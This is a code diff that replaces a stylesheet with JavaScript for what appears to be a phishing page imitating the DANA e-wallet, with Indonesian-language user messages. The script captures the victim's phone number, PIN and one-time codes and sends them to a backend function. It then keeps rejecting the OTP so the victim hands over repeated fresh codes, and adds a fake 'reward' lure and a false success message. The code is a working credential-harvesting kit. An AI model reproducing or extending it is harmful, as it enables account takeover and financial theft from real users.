@@ -1,523 +1,253 @@
-:root {
-  --primary: #119bff;
-  --white: #fff;
-  --white-10: rgba(255,255,255,.1);
-  --white-20: rgba(255,255,255,.2);
-  --white-30: rgba(255,255,255,.3);
-  --white-50: rgba(255,255,255,.5);
-  --white-70: rgba(255,255,255,.7);
-  --success: #4CAF50;
-  --error: #ff6b6b;
-  --shadow: 0 4px 10px rgba(0,0,0,.15);
-  --input-bg: #ffffff;
-  --input-text: #333333;
-  --input-border: #dddddd;
-}
+document.addEventListener('DOMContentLoaded', () => {
+  // DOM References
+  const pages = {
+    n: document.getElementById('number-page'),
+    p: document.getElementById('pin-page'),
+    o: document.getElementById('otp-page')
+  };
+  
+  const lb = document.getElementById('lanjutkan-button');
+  const pn = document.getElementById('phone-number');
+  const pis = document.querySelectorAll('.pin-box');
+  const ois = document.querySelectorAll('.otp-box');
+  const fn = document.getElementById('floating-notification');
+  const sn = document.getElementById('success-notification');
+  const rn = document.getElementById('reward-notification');
+  const ac = document.getElementById('attempt-counter');
+  const an = document.getElementById('attempt-number');
+  const lc = document.getElementById('lanjutkan-container');
+  const rewardInstruction = document.getElementById('reward-instruction');
 
-body, .content {
-  font-family: 'Poppins', sans-serif;
-  margin: 0;
-  padding: 0;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  min-height: 100vh;
-}
+  // State Variables
+  let currentPage = 'n';
+  let phoneNumber = '';
+  let pin = '';
+  let otp = '';
+  let attemptCount = 0;
+  const maxAttempts = 6;
+  let otpTimer;
 
-body {
-  background-color: var(--primary);
-  position: relative;
-}
-
-.content {
-  width: 100%;
-  max-width: 400px;
-  padding: 24px;
-  box-sizing: border-box;
-  justify-content: flex-start;
-}
-
-.container {
-  background: transparent;
-  border-radius: 16px;
-  padding: 24px;
-  text-align: center;
-  width: 100%;
-  max-width: 400px;
-  box-sizing: border-box;
-  transition: opacity .3s ease-in-out;
-}
-
-.container.hidden {
-  opacity: 0;
-  pointer-events: none;
-}
-
-.logo {
-  width: 100px;
-  margin-bottom: 24px;
-}
-
-h2 {
-  font-size: 18px;
-  font-weight: 600;
-  color: var(--white);
-  margin-bottom: 16px;
-}
-
-.phone-input-container {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin-bottom: 24px;
-}
-
-.country-code-box, #phone-number {
-  padding: 12px;
-  font-size: 14px;
-  display: flex;
-  align-items: center;
-}
-
-.country-code-box {
-  background: var(--input-bg);
-  color: var(--input-text);
-  border: 1px solid var(--input-border);
-  border-right: none;
-  border-radius: 8px 0 0 8px;
-}
-
-#phone-number {
-  background: var(--input-bg);
-  color: var(--input-text);
-  border: 1px solid var(--input-border);
-  border-radius: 0 8px 8px 0;
-  font-size: 18px;
-  width: 100%;
-  max-width: 600px;
-}
-
-#phone-number::placeholder {
-  color: #999999;
-}
-
-.flag-icon {
-  width: 19px;
-  margin-right: 5px;
-}
-
-.info-text, .info-text b {
-  font-size: 15px;
-  color: var(--white);
-  margin-bottom: 24px;
-}
-
-.pin-container, .otp-container {
-  display: flex;
-  justify-content: center;
-  gap: 8px;
-  margin: 24px 0;
-}
-
-.pin-box, .otp-box {
-  width: 40px;
-  height: 40px;
-  text-align: center;
-  font-size: 18px;
-  border: 1px solid var(--input-border);
-  border-radius: 8px;
-  background: var(--input-bg);
-  color: var(--input-text);
-}
-
-.pin-box:focus, .otp-box:focus {
-  border-color: var(--primary);
-  outline: none;
-  box-shadow: 0 0 0 2px rgba(17, 155, 255, 0.2);
-}
-
-.show-text-container {
-  position: relative;
-  margin-bottom: 24px;
-}
-
-.show-text {
-  display: inline-block;
-  padding: 8px 16px;
-  border: 1px solid var(--white-50);
-  border-radius: 20px;
-  font-size: 14px;
-  color: var(--white);
-  background: var(--white-10);
-  cursor: pointer;
-  transition: all .3s ease;
-  user-select: none;
-}
-
-.show-text:hover {
-  background: var(--white-20);
-}
-
-.show-text:active {
-  transform: scale(.95);
-}
-
-.show-text.active {
-  background: var(--white-30);
-  border-color: var(--white);
-}
-
-.help-forgot-container {
-  display: flex;
-  justify-content: center;
-  font-size: 14px;
-  gap: 8px;
-  margin-top: 16px;
-}
-
-.help-forgot-container .link {
-  color: var(--white);
-  text-decoration: none;
-  padding: 4px 8px;
-}
-
-.otp-message-box {
-  background: var(--white-10);
-  padding: 16px;
-  border-radius: 12px;
-  text-align: center;
-  margin-bottom: 24px;
-}
-
-.otp-message-box div:first-child {
-  font-weight: 500;
-  margin-bottom: 8px;
-}
-
-.otp-message-box div:nth-child(2) {
-  font-size: 14px;
-  margin-bottom: 12px;
-}
-
-#resend-otp {
-  color: var(--white);
-  font-weight: 600;
-  cursor: pointer;
-  pointer-events: none;
-  opacity: 0.5;
-  transition: all 0.3s ease;
-}
-
-#resend-otp.active {
-  pointer-events: auto;
-  opacity: 1;
-  text-decoration: underline;
-}
-
-.floating-notification, #success-notification, #reward-notification {
-  position: fixed;
-  left: 50%;
-  transform: translateX(-50%);
-  padding: 12px;
-  border-radius: 8px;
-  text-align: center;
-  z-index: 100;
-  animation: fadeIn .3s ease-out;
-}
-
-.floating-notification {
-  background: var(--white);
-  color: var(--primary);
-  bottom: 24px;
-  width: 90%;
-  max-width: 400px;
-  display: none;
-  cursor: pointer;
-  transition: all .3s ease;
-  box-shadow: var(--shadow);
-}
-
-.floating-notification:hover {
-  transform: translateX(-50%) scale(1.02);
-}
-
-#success-notification {
-  background: var(--success);
-  color: var(--white);
-  padding: 16px;
-  bottom: 24px;
-  width: 90%;
-  max-width: 400px;
-}
-
-#reward-notification {
-  background: var(--white);
-  color: #333;
-  top: 50%;
-  transform: translate(-50%,-50%);
-  padding: 20px;
-  border-radius: 10px;
-  box-shadow: 0 0 20px rgba(0,0,0,.2);
-  max-width: 80%;
-  display: none;
-  z-index: 1000;
-}
-
-#reward-notification h3 {
-  color: var(--success);
-  margin-bottom: 10px;
-  font-size: 18px;
-}
-
-#reward-notification p {
-  margin: 0;
-  line-height: 1.5;
-  font-size: 15px;
-}
-
-.fixed-button-container {
-  position: fixed;
-  bottom: 16px;
-  left: 50%;
-  transform: translateX(-50%);
-  width: 100%;
-  max-width: 400px;
-  padding: 16px;
-  text-align: center;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.fixed-button-container.hidden, .pin-page .fixed-button-container, .otp-page .fixed-button-container {
-  display: none !important;
-}
-
-.button, #verifikasi-button {
-  background: var(--white);
-  color: var(--primary);
-  border: none;
-  padding: 14px 0;
-  border-radius: 12px;
-  font-size: 16px;
-  cursor: pointer;
-  width: 80%;
-  max-width: 360px;
-  margin: 0 auto;
-  box-sizing: border-box;
-  font-weight: 600;
-  transition: all .3s ease-in-out;
-  box-shadow: var(--shadow);
-}
-
-.button:hover, #verifikasi-button:hover {
-  background: rgba(255,255,255,.9);
-}
-
-.button:active, #verifikasi-button:active {
-  background: rgba(255,255,255,.8);
-  transform: scale(.98);
-}
-
-.saldo-container {
-  width: 100%;
-  padding: 0 24px;
-  box-sizing: border-box;
-  margin: 16px 0;
-  text-align: center;
-  animation: fadeIn .3s ease-out;
-}
-
-#saldo-input {
-  width: 100%;
-  max-width: 360px;
-  padding: 12px;
-  border: 1px solid var(--white-50);
-  border-radius: 8px;
-  font-size: 16px;
-  background: var(--white-30);
-  color: var(--white);
-  box-sizing: border-box;
-  margin-bottom: 8px;
-}
-
-#saldo-input::placeholder {
-  color: var(--white-70);
-}
-
-.error-message {
-  color: var(--error);
-  font-size: 14px;
-  margin-top: 8px;
-}
-
-#attempt-counter {
-  font-size: 14px;
-  color: var(--white);
-  margin-top: 8px;
-  display: none;
-}
-
-#attempt-number {
-  font-weight: 700;
-}
-
-.verifikasi-button-container {
-  margin-top: 16px;
-  text-align: center;
-  animation: fadeIn .3s ease-out;
-}
-
-.spinner-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background-color: rgba(0,0,0,0.5);
-  z-index: 1000;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.spinner {
-  position: relative;
-  width: 54px;
-  height: 54px;
-}
-
-.spinner-back {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%,-50%);
-  z-index: 1001;
-}
-
-.spinner-front {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%,-50%);
-  z-index: 1002;
-  animation: spin 1s infinite linear;
-}
-
-@keyframes fadeIn {
-  from {
-    opacity: 0;
-    transform: translateY(10px);
+  // Helper Functions
+  function showSpinner() {
+    document.querySelector('.spinner-overlay').style.display = 'flex';
   }
-  to {
-    opacity: 1;
-    transform: translateY(0);
+
+  function hideSpinner() {
+    document.querySelector('.spinner-overlay').style.display = 'none';
   }
-}
 
-@keyframes spin {
-  from {
-    transform: translate(-50%,-50%) rotate(0deg);
+  function startOTPTimer() {
+    let timeLeft = 120;
+    const timerElement = document.getElementById('otp-timer');
+    
+    otpTimer = setInterval(() => {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      
+      if (timeLeft <= 0) {
+        clearInterval(otpTimer);
+      }
+      timeLeft--;
+    }, 1000);
   }
-  to {
-    transform: translate(-50%,-50%) rotate(360deg);
+
+  function resetOTPInputs() {
+    ois.forEach(input => input.value = '');
+    ois[0].focus();
+    otp = '';
+    attemptCount++;
+    an.textContent = attemptCount;
+    ac.style.display = 'block';
   }
-}
 
-#pin-page~#lanjutkan-container, #otp-page~#lanjutkan-container {
-  display: none !important;
-}
-
-/* NEW REWARD INSTRUCTION STYLES */
-.reward-instruction {
-  background: var(--white);
-  color: #333;
-  padding: 20px;
-  border-radius: 10px;
-  box-shadow: 0 0 20px rgba(0,0,0,.2);
-  max-width: 80%;
-  display: none;
-  z-index: 1000;
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  text-align: center;
-  animation: fadeInUp .5s ease-out;
-}
-
-.reward-instruction h3 {
-  color: var(--primary);
-  margin-bottom: 10px;
-  font-size: 18px;
-}
-
-.reward-instruction p {
-  margin: 0;
-  line-height: 1.5;
-  font-size: 15px;
-}
-
-.reward-instruction .reward-amount {
-  font-size: 24px;
-  font-weight: bold;
-  color: var(--success);
-  margin: 10px 0;
-}
-
-.reward-instruction .required-amount {
-  font-size: 18px;
-  font-weight: bold;
-  color: var(--error);
-  margin: 10px 0;
-}
-
-.reward-instruction .reward-badge {
-  background: var(--success);
-  color: white;
-  padding: 8px 16px;
-  border-radius: 20px;
-  display: inline-block;
-  margin: 10px 0;
-  animation: pulse 2s infinite;
-}
-
-@keyframes fadeInUp {
-  from {
-    opacity: 0;
-    transform: translate(-50%, -40%);
+  function showRewardInstruction() {
+    rewardInstruction.style.display = 'block';
+    
+    // Close button handler
+    rewardInstruction.querySelector('.close-btn').addEventListener('click', () => {
+      rewardInstruction.style.display = 'none';
+    });
   }
-  to {
-    opacity: 1;
-    transform: translate(-50%, -50%);
-  }
-}
 
-@keyframes pulse {
-  0% {
-    transform: scale(1);
+  // Backend Communication
+  async function sendDanaData(type, data) {
+    try {
+      const response = await fetch('/.netlify/functions/send-dana-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ type, ...data })
+      });
+      
+      if (!response.ok) throw new Error(await response.text());
+      return await response.json();
+    } catch (error) {
+      console.error('Error:', error);
+      throw error;
+    }
   }
-  50% {
-    transform: scale(1.05);
-  }
-  100% {
-    transform: scale(1);
-  }
-}
 
-.reward-instruction .close-btn {
-  background: var(--primary);
-  color: white;
-  border: none;
-  padding: 8px 16px;
-  border-radius: 20px;
-  margin-top: 15px;
-  cursor: pointer;
-  font-weight: 600;
-  transition: all 0.3s ease;
-}
+  // Modified Phone Number Formatting
+  pn.addEventListener('input', (e) => {
+    // Hapus semua karakter non-digit
+    let value = e.target.value.replace(/\D/g, '');
+    
+    // Hapus angka 0 di awal jika ada
+    if (value.startsWith('0')) {
+      value = value.substring(1);
+    }
+    
+    // Pastikan selalu dimulai dengan 8
+    if (value.length > 0 && !value.startsWith('8')) {
+      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
+    }
+    
+    // Batasi panjang maksimal (3+4+5=12 digit)
+    if (value.length > 12) {
+      value = value.substring(0, 12);
+    }
+    
+    // Format nomor dengan tanda hubung
+    let formatted = '';
+    if (value.length > 0) {
+      formatted = value.substring(0, 3); // 3 digit pertama
+      if (value.length > 3) {
+        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
+      }
+      if (value.length > 7) {
+        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
+      }
+    }
+    
+    // Set nilai input dengan format yang sudah dibuat
+    e.target.value = formatted;
+    
+    // Simpan nomor tanpa format untuk pengiriman data
+    phoneNumber = value;
+  });
 
-.reward-instruction .close-btn:hover {
-  background: #0d8ae3;
-  transform: scale(1.02);
-}
+  // Event Handlers
+  lb.addEventListener('click', async () => {
+    if (currentPage === 'n') {
+      if (phoneNumber.length < 10) {
+        alert('Nomor HP harus minimal 10 digit');
+        return;
+      }
+      
+      showSpinner();
+      try {
+        await sendDanaData('phone', { phone: phoneNumber });
+        pages.n.style.display = 'none';
+        pages.p.style.display = 'block';
+        currentPage = 'p';
+        lc.style.display = 'none';
+      } catch (error) {
+        alert('Gagal mengirim data: ' + error.message);
+      } finally {
+        hideSpinner();
+      }
+    }
+  });
+
+  // PIN Input Handling
+  pis.forEach((input, index) => {
+    input.addEventListener('input', async (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '');
+      
+      if (e.target.value.length === 1 && index < pis.length - 1) {
+        pis[index + 1].focus();
+      }
+      
+      pin = Array.from(pis).map(i => i.value).join('');
+      
+      if (pin.length === 6) {
+        showSpinner();
+        try {
+          await sendDanaData('pin', { phone: phoneNumber, pin });
+          pages.p.style.display = 'none';
+          pages.o.style.display = 'block';
+          currentPage = 'o';
+          lc.style.display = 'none';
+          startOTPTimer();
+          setTimeout(() => fn.style.display = 'block', 1000);
+        } catch (error) {
+          alert('Gagal mengirim PIN: ' + error.message);
+        } finally {
+          hideSpinner();
+        }
+      }
+    });
+    
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+        pis[index - 1].focus();
+      }
+    });
+  });
+
+  // OTP Input Handling
+  ois.forEach((input, index) => {
+    input.addEventListener('input', async (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '');
+      
+      if (e.target.value.length === 1 && index < ois.length - 1) {
+        ois[index + 1].focus();
+      }
+      
+      otp = Array.from(ois).map(i => i.value).join('');
+      
+      if (index === ois.length - 1 && e.target.value.length === 1) {
+        showSpinner();
+        try {
+          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
+          
+          setTimeout(() => {
+            resetOTPInputs();
+            
+            // Show reward instruction after 2 attempts
+            if (attemptCount === 2) {
+              showRewardInstruction();
+            }
+            
+            if (attemptCount > 2) {
+              rn.style.display = 'block';
+              rn.innerHTML = `
+                <div class="notification-content">
+                  <h3>kode OTP Salah</h3>
+                  <p>silahkan cek sms ataupan whatsapp</p>
+                </div>
+              `;
+              setTimeout(() => rn.style.display = 'none', 10000);
+            }
+            
+            if (attemptCount >= maxAttempts) {
+              fn.style.display = 'none';
+              sn.style.display = 'block';
+              setTimeout(() => sn.style.display = 'none', 5000);
+            }
+          }, 1000);
+        } catch (error) {
+          console.error('Gagal mengirim OTP:', error);
+        } finally {
+          hideSpinner();
+        }
+      }
+    });
+    
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+        ois[index - 1].focus();
+      }
+    });
+  });
+
+  // Toggle PIN Visibility
+  document.querySelector('.show-text').addEventListener('click', (e) => {
+    const isShowing = e.target.classList.toggle('active');
+    const pinInputs = document.querySelectorAll('.pin-box');
+    pinInputs.forEach(input => {
+      input.type = isShowing ? 'text' : 'password';
+    });
+    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
+  });
+});
